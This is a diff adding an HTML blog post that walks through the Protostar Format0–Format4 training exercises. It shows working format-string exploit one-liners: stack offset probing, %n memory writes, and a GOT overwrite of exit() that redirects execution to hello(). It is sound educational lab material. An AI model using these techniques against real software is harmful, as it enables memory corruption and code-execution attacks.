@@ -1,0 +1,358 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Protostar: Format - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="Reading Material Exploiting Format String Vulnerablities Format0 In Format0, our goal is to overflow the buffer variable, and change target to & &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2016/07/01/Protostar_Format/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Protostar: Format</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-07-01T11:32:32+08:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2016</span></span> <span class='time'>11:32 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><!--more-->
+
+
+<h2>Reading Material</h2>
+
+<p><a href="https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">Exploiting Format String Vulnerablities</a></p>
+
+<h2><a href="https://exploit-exercises.com/protostar/format0/">Format0</a></h2>
+
+<p>In Format0, our goal is to overflow the <strong>buffer</strong> variable, and change <strong>target</strong> to &ldquo;0xdeadbeef&rdquo;.</p>
+
+<p>The hint says this should be done in less than 10 bytes of input. We can easily fill the <strong>buffer</strong> using 4 bytes: &ldquo;%64d&rdquo;. And the value right after it, will overflow and change <strong>target</strong>&rsquo;s value.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format0 `python -c 'print "%64d\xef\xbe\xad \xde"'`
+you have hit the target correctly :)
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/format1/">Format1</a></h2>
+
+<p>This time, our target is not on the stack anymore. We need it&rsquo;s address to procedure, and it can be done by using &ldquo;objdump -t&rdquo;.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -t ./format1 | grep target
+08049638 g     O .bss   00000004              target
+</code></pre>
+
+<p>The address of <strong>target</strong> is 0x08049638. Next, we will run some test to find out the position of our input located on the stack.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "AAAAAAAA"+"0x%08x."*150'`
+AAAAAAAA0x0804960c.0xbffff3c8.0x08048469.0xb7fd8304.0xb7fd7ff4.0xbffff3c8.0x08048435.0xbffff596.0xb7ff1040.0x0804845b.0xb7fd7ff4.0x08048450.0x00000000.0xbffff448.0xb7eadc76.0x00000002.0xbffff474.0xbffff480.0xb7fe1848.0xbffff430.0xffffffff.0xb7ffeff4.0x0804824d.0x00000001.0xbffff430.0xb7ff0626.0xb7fffab0.0xb7fe1b28.0xb7fd7ff4.0x00000000.0x00000000.0xbffff448.0x00ff9eb6.0x2aa048a6.0x00000000.0x00000000.0x00000000.0x00000002.0x08048340.0x00000000.0xb7ff6210.0xb7eadb9b.0xb7ffeff4.0x00000002.0x08048340.0x00000000.0x08048361.0x0804841c.0x00000002.0xbffff474.0x08048450.0x08048440.0xb7ff1040.0xbffff46c.0xb7fff8f8.0x00000002.0xbffff58c.0xbffff596.0x00000000.0xbffff9b9.0xbffff9c7.0xbffff9d2.0xbffff9f4.0xbffffa07.0xbffffa11.0xbfffff01.0xbfffff3f.0xbfffff53.0xbfffff6a.0xbfffff7b.0xbfffff83.0xbfffff93.0xbfffffa0.0xbfffffd4.0xbfffffe6.0x00000000.0x00000020.0xb7fe2414.0x00000021.0xb7fe2000.0x00000010.0x078bfbbf.0x00000006.0x00001000.0x00000011.0x00000064.0x00000003.0x08048034.0x00000004.0x00000020.0x00000005.0x00000007.0x00000007.0xb7fe3000.0x00000008.0x00000000.0x00000009.0x08048340.0x0000000b.0x000003e9.0x0000000c.0x00000000.0x0000000d.0x000003e9.0x0000000e.0x000003e9.0x00000017.0x00000001.0x00000019.0xbffff56b.0x0000001f.0xbffffff2.0x0000000f.0xbffff57b.0x00000000.0x00000000.0x00000000.0x64000000.0x1fcbe298.0xf6e4ff8c.0x3f504c64.0x69d64c2b.0x00363836.0x00000000.0x00000000.0x00000000.0x6f662f2e.0x74616d72.0x41410031.0x41414141.0x78304141.0x78383025.0x2578302e.0x2e783830.0x30257830.0x302e7838.0x38302578.0x78302e78.0x78383025.0x2578302e.0x2e783830.0x30257830.0x302e7838.0x38302578.0x78302e78.0x78383025.0x2578302e.0x2e783830.0x30257830.0x302e7838.
+</code></pre>
+
+<p>We can find our input has the offset of 610(127*4+2) away from ESP. Let&rsquo;s modify the test code shorter and run again.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "AAAAAAAA"+"%130$x."'`
+AAAAAAAA41414100.
+</code></pre>
+
+<p>Looks like we might need one more byte for a perfect &ldquo;0x41414141&rdquo;. I&rsquo;ll put another &ldquo;A&rdquo; in, and replace the first four &ldquo;A&#8221;s with &#8220;B&#8221;s.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "BBBBAAAAA"+"%130$x."'`
+BBBBAAAAA42424242.
+</code></pre>
+
+<p>Now we have a beautiful &ldquo;0x42424242&rdquo; here. Hence we can modify it to our final address, and replace &ldquo;%130$x&rdquo; with &ldquo;%130$n&rdquo;, so we can write some value into <strong>target</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "AA\x38\x96\x04\x08AA"+"0x%130$08x"'`
+AA8AA0x08049638
+</code></pre>
+
+<p>The final step, we will modify , so we can &ldquo;write&rdquo; some value into <strong>target</strong></p>
+
+<pre><code>.user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "\x38\x96\x04\x08AAAAA"+"%130$n."'`
+8AAAAA.you have modified the target :)
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/format2/">Format2</a></h2>
+
+<p>We&rsquo;ll retrieve the address of <strong>target</strong> with &ldquo;objdump -t&rdquo; again.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -t ./format2 | grep target
+080496e4 g     O .bss   00000004              target
+</code></pre>
+
+<p>Then we can find out the offset to our input with test code.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "AAAABBBB"+"%08x."*10' | ./format2
+AAAABBBB00000200.b7fd8420.bffff614.41414141.42424242.78383025.3830252e.30252e78.252e7838.2e783830.
+</code></pre>
+
+<p>But, Format2 asks us to modify the value of <strong>target</strong> to &ldquo;64&rdquo;. So we need to print out exact 64 bytes before we use &ldquo;%n&rdquo; to write the value.</p>
+
+<pre><code>python -c 'print "%60d\xe4\x96\x04\x08"+"%5$n"' | ./format2
+                                                     512▒
+you have modified the target :)
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/format3/">Format3</a></h2>
+
+<p>Here&rsquo;s the address of <strong>target</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -t ./format3 | grep target
+080496f4 g     O .bss   00000004              target
+</code></pre>
+
+<p>In Format3, we are challenged to write the value &ldquo;0x01025544&rdquo; into <strong>target</strong>. This needs to be done carefully. We will do it one byte per step.</p>
+
+<p>Let&rsquo;s examine the the location of our input first.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "AAAABBBB"+"%x."*13' | ./format3
+AAAABBBB0.bffff5d0.b7fd7ff4.0.0.bffff7d8.804849d.bffff5d0.200.b7fd8420.bffff614.41414141.42424242.
+</code></pre>
+
+<p>Here we have &ldquo;AAAA&rdquo; at 12, and &ldquo;BBBB&rdquo; at 13. Now we can replace them with the value we want.</p>
+
+<p>The first byte of <strong>target</strong> is &ldquo;0x44&rdquo;, which means we need to print 68 bytes before &ldquo;%n&rdquo;.</p>
+
+<pre><code>python -c 'print "\xf4\x96\x04\x08%64d%12$n"' | ./format3
+                                                           0
+target is 00000044 :(
+</code></pre>
+
+<p>The second byte is &ldquo;0x55&rdquo;, that is 85 in decimal. Since we already print 68 bytes already, we just need to fill the 17 bytes left before next &ldquo;%n&rdquo;. And don&rsquo;t forget to shift the address of <strong>target</strong> for one byte.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08%60d%12$n%17d%13$n"' | ./format3
+                                                           0      -1073744432
+target is 00005544 :(
+</code></pre>
+
+<p>Notice that I inserted the address of second byte &ldquo;0x080496f5&rdquo; right after the first four byte? That would make us calculate the offset easier. But, since we add another 4 bytes before &ldquo;%64d&rdquo;, we need to make it &ldquo;%60d&rdquo; to keep the counting right.</p>
+
+<p>The third byte and the forth byte is &ldquo;0x0102&rdquo;. We can finish them in one step, just by writing the value at &ldquo;0x080496f6&rdquo;.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08%56d%12$n%17d%13$n%173d%14$n"' | ./format3
+                                                       0      -1073744432                                                                                                                                                                  -1208123404
+you have modified the target :)
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/format4/">Format4</a></h2>
+
+<p>Format4 asks us to redirect the code flow to <strong>hello()</strong>. By examining the code, we have <strong>print()</strong> and <strong>exit()</strong> after <strong>fgets()</strong>. But, we need <strong>print()</strong> to tell us if we have succeed or not, so <strong>exit()</strong> is the only option left.</p>
+
+<p>First we check the dynamic relocation address for <strong>exit()</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -TR ./format4
+--snip--
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080496fc R_386_GLOB_DAT    __gmon_start__
+08049730 R_386_COPY        stdin
+0804970c R_386_JUMP_SLOT   __gmon_start__
+08049710 R_386_JUMP_SLOT   fgets
+08049714 R_386_JUMP_SLOT   __libc_start_main
+08049718 R_386_JUMP_SLOT   _exit
+0804971c R_386_JUMP_SLOT   printf
+08049720 R_386_JUMP_SLOT   puts
+08049724 R_386_JUMP_SLOT   exit
+</code></pre>
+
+<p>And we also need the address of <strong>hello()</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -D ./format4 | grep hello
+080484b4 &lt;hello&gt;:
+</code></pre>
+
+<p>So, our mission here is to replace the memory in &ldquo;0x08049724&rdquo; to &ldquo;0x080484b4&rdquo;. The last thing to find is the actual location of our input.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "AAAABBBB"+"%08x."*10' | ./format4
+AAAABBBB00000200.b7fd8420.bffff614.41414141.42424242.78383025.3830252e.30252e78.252e7838.2e783830.
+</code></pre>
+
+<p>We got &ldquo;AAAA&rdquo; at 4. Now we can build our final payload just like we did in Format3.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x27\x97\x04\x08%168d%4$n%976d%5$n%132d%6$n"' | ./format4
+$%'                                                                                                                                                                     512                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     -1208122336                                                                                                                         -1073744364
+code execution redirected! you win
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2016-07-01T11:32:32+08:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2016</span></span> <span class='time'>11:32 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/protostar/'>protostar</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2016/07/01/Protostar_Format/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2016/07/01/Protostar_Format/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2016/06/30/Protostar_Stack/" title="Previous Post: Protostar: Stack">&laquo; Protostar: Stack</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <p><a href="https://facebook.com/newdominic"><img src="/images/facebook.png" width="30" height="30"></a>
+<a href="https://twitter.com/newdominic"><img src="/images/twitter.png" width="30" height="30"></a></p>
+  <p><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/"><img src="/images/oscp.png" width="250" height="32"></a></p>
+</section>
+<section>
+  <h1>Recent posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/07/01/Protostar_Format/">Protostar: Format</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/30/Protostar_Stack/">Protostar: Stack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/29/PWK_and_OSCP/">Offensive Security Certified Professional</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/20/droopyv0.2/">Droopy: v0.2</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/18/vulnosv2/">VulnOS: 2</a>
+      </li>
+    
+  </ul>
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
